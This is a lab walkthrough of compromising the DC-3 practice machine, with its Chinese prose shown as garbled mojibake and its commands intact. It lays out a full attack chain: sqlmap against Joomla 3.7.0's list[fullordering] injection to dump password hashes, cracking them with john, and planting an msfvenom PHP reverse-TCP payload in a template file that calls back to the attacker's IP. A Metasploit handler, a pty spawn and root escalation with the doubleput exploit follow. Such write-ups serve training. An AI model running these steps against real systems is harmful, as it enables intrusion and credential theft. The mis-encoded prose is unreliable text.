
# 0x00ç¯å¢ƒ

æ”»å‡»æœºï¼škaliï¼ˆ192.168.1.28ï¼‰

é¶æœºï¼šDC-3ï¼ˆ192.168.1.ï¼‰


# 0x01å®æˆ˜


## ç«¯å£æ‰«æ

```
nmap -sV -A -p- 192.168.1.11
```

![image-20220110203517991.png](_img\06-é¶åœºå®è·µ/1652256194361-2524b082-b229-477f-b617-b79465006747.png)

å¯ä»¥çœ‹åˆ°ç›®æ ‡æœºå¼€æ”¾äº†80ç«¯å£HTTPæœåŠ¡


## ç›®å½•æ‰«æ

å¯ä»¥çœ‹åˆ°ç½‘ç«™åå°è·¯å¾„

![image-20220110204506347.png](_img\06-é¶åœºå®è·µ/1652256198478-a01eb2d4-dbd3-45af-ba37-9c16481360b7.png)

åœ¨æµè§ˆå™¨è®¿é—®ç½‘ç«™åå°ï¼Œé€šè¿‡æ ‡é¢˜å¯ä»¥å‘ç°ä½¿ç”¨çš„æ˜¯joomlaæ­å»ºçš„ç«™ç‚¹

![image-20220110204514438.png](_img\06-é¶åœºå®è·µ/1652256202188-c8f13d83-e81c-4597-ae1c-53c8374f3b2d.png)


## æ¼æ´æ‰«æ

å·²ç»çŸ¥é“æ˜¯ä½¿ç”¨çš„joomlaæ­å»ºçš„ç«™ç‚¹é‚£ä¹ˆä½¿ç”¨joomscanæ‰«æç«™ç‚¹

[ä¸çŸ¥é“ä»€ä¹ˆæ˜¯joomscan?ç‚¹è¿™é‡Œ](https://www.freebuf.com/sectool/181440.html)

```
joomscan --url http://192.168.1.11
```

![image-20220110204557133.png](_img\06-é¶åœºå®è·µ/1652256207763-5a96fe0a-fbc1-45a4-88dc-80925012127d.png)

ä»ç»“æœå¯ä»¥çœ‹åˆ° joomlaçš„ç‰ˆæœ¬æ˜¯ 3.7.0

æŸ¥çœ‹joomla 3.7.0çš„æ¼æ´æœ‰å“ªäº›

```
searchsploit joomla 3.7.0
```

![image-20220110204618326.png](_img\06-é¶åœºå®è·µ/1652256212029-e0578894-125c-4994-895a-8c6e4565b027.png)

å¯ä»¥å‘ç°joomla 3.7.0 å­˜åœ¨SQLæ³¨å…¥æ¼æ´

æŸ¥çœ‹42033.txtçš„å†…å®¹

![image-20220110204807674.png](_img\06-é¶åœºå®è·µ/1652256215174-262be897-e1a4-4d75-a437-693ffc318999.png)

æ–‡æ¡£ä¸­æŒ‡å‡ºå¯ä»¥ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ å¹¶å°†å‚æ•°åˆ—äº†å‡ºæ¥


## æ¼æ´åˆ©ç”¨

ä½¿ç”¨sqlmapæ‰«æï¼Œæš´åº“

```
sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![image-20220110205106024.png](_img\06-é¶åœºå®è·µ/1652256221047-9a27c003-22a5-4e97-9492-e2f20d8c9f9b.png)

çˆ†è¡¨

```
sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

![image-20220110205257745.png](_img\06-é¶åœºå®è·µ/1652256225003-39ef2db6-b0cd-4eaf-a561-b915f46b3045.png)

çˆ†å­—æ®µ

```
sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" --columns -p list[fullordering]
```

![image-20220110205625696.png](_img\06-é¶åœºå®è·µ/1652256228844-accac433-9b27-4402-b76d-a2edf7d670b9.png)

æ‹–åº“

```
sqlmap -u "http://192.168.1.11/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C "name,password" --dump -p list[fullordering]
```

![image-20220110205722192.png](_img\06-é¶åœºå®è·µ/1652256232749-97da86f2-c589-44cb-8b56-0679427cae83.png)

å¾—åˆ°äº†adminå’Œå¯†ç çš„å“ˆå¸Œå€¼

å°†å¯†ç å­˜å…¥æ–‡ä»¶passwordä¸­ä½¿ç”¨johnç ´è§£

```
john password
```

![image-20220110205855317.png](_img\06-é¶åœºå®è·µ/1652256235949-5385e53e-a1f4-4278-a5b7-f5e96ec0322b.png)

å¾—åˆ°äº†å¯†ç snoopy

ç™»é™†åå°

![image-20220110205928274.png](_img\06-é¶åœºå®è·µ/1652256239394-868519b5-9676-490c-ba25-ee24799dd107.png)

åœ¨templateæ ä¸­å‘ç°å¯ä»¥å†™æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªæœ¨é©¬ä¸Šå»

![image-20220110210247843.png](_img\06-é¶åœºå®è·µ/1652256243049-30ea4c2a-4e93-4cd8-856f-ebf61b7fa98d.png)


## åå¼¹shell

ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªphpæœ¨é©¬æ–‡ä»¶

```
msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.1.28 port=4444 -f raw
```

![image-20220110211818024.png](_img\06-é¶åœºå®è·µ/1652256247617-e4d301bb-cd3a-40c0-a4e3-056439f82c67.png)

å°†error.phpæ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºç”Ÿæˆçš„æœ¨é©¬å†…å®¹ä¿å­˜

![image-20220110212201986.png](_img\06-é¶åœºå®è·µ/1652256253133-deb863e1-4346-4f62-9d00-790587b2d0f4.png)

åˆ›å»ºç›‘å¬

```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.28
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```

åœ¨æµè§ˆå™¨ä¸­è®¿é—®æœ¨é©¬æ–‡ä»¶å°±å¾—çŸ¥é“æœ¨é©¬æ–‡ä»¶æ‰€åœ¨çš„ä½ç½®

![image-20220110212256338.png](_img\06-é¶åœºå®è·µ/1652256256478-508db622-e3cd-4ba3-90ca-1e596c893675.png)

```
http://192.168.1.11/templates/beez3/error.php
```

æˆåŠŸåå¼¹shell

![image-20220110212314866.png](_img\06-é¶åœºå®è·µ/1652256260909-c8134e9a-0cd8-46b6-b8ca-68d51ef866fa.png)


## ææƒ

è¿›å…¥shellï¼Œå¹¶ä½¿ç•Œé¢çœ‹èµ·æ¥æ­£å¸¸

```
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20220110212754433.png](_img\06-é¶åœºå®è·µ/1652256265639-360a7de5-7ddf-42f4-9e31-756a84577f5e.png)

æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬

```
cat /proc/version
cat /etc/issue
```

![image-20220110212917909.png](_img\06-é¶åœºå®è·µ/1652256268955-c5c8557f-12a0-40ca-b4c9-a0255e0bafb1.png)

æŸ¥æ‰¾Ubuntu16.04çš„ææƒæ¼æ´

```
searchsploit Ubuntu 16.04
```

![image-20220110213039355.png](_img\06-é¶åœºå®è·µ/1652256272323-7313e9ba-e1be-4480-9240-bb4e085a4746.png)

æŸ¥çœ‹39772.txtçš„å†…å®¹

```
cat /usr/share/exploitdb/exploits/linux/local/39772.txt
```

åœ¨æ–‡æœ«å¯ä»¥çœ‹åˆ°åˆ©ç”¨æ–¹æ³•å’Œä¸‹è½½åœ°å€

![image-20220110213400265.png](_img\06-é¶åœºå®è·µ/1652256276825-892161df-ddbd-49a5-9c92-8520e17135a9.png)

å°†æ–‡ä»¶ä¸‹è½½åˆ°æ”»å‡»æœºä¸­å¹¶ä¸Šä¼ åˆ°é¶æœºçš„/tmpç›®å½•

```
upload /root/39772.zip /tmp
```

![image-20220110213852195.png](_img\06-é¶åœºå®è·µ/1652256281364-6e58070c-b239-4fc3-a365-942085999709.png)

è¿›å…¥shellè§£å‹

![image-20220110214210063.png](_img\06-é¶åœºå®è·µ/1652256288370-c9dd8843-b368-4955-8917-667e3dc8984b.png)

ç¼–è¯‘

```
./compile.sh
```

![image-20220110214359617.png](_img\06-é¶åœºå®è·µ/1652256292932-3a493d4f-be09-4c8e-8ea9-40ad401420c8.png)

ææƒ

```
./doubleput
```

![image-20220110214703808.png](_img\06-é¶åœºå®è·µ/1652256299833-34e131d2-c760-4774-9cbd-ef8f85b664eb.png)


## final-flag

åœ¨rootgæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag

![image-20220110214935672.png](_img\06-é¶åœºå®è·µ/1652256305412-6b1fa477-4ba3-4204-98c2-b4c8fda8b770.png)
